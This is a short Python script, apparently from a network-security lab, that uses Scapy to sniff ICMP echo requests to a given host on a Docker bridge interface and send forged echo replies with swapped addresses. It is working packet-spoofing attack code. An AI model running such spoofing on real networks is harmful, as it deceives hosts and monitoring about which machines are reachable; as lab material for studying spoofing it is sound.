#!/usr/bin/env python3
from scapy.all import *
import argparse

def spoof_pkt(pkt):
    # if ICMP echo request
    if ICMP in pkt and pkt[ICMP].type == 8:
        print("===== ORIGINAL =====")
        print("Source IP : ", pkt[IP].src)
        print("Destination IP :", pkt[IP].dst)

        # create ICMP echo reply
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)	
        # swap src and dst
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        data = pkt[Raw].load
        newpkt = ip/icmp/data

        print("===== SPOOFED ======")
        print("Source IP : ", newpkt[IP].src)
        print("Destination IP :", newpkt[IP].dst)

        send(newpkt, verbose=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str)
	
    args = parser.parse_args()
		
    filter = f'icmp and host {args.host}'
    pkt = sniff(iface = 'br-4ab028389181', filter=filter, prn=spoof_pkt)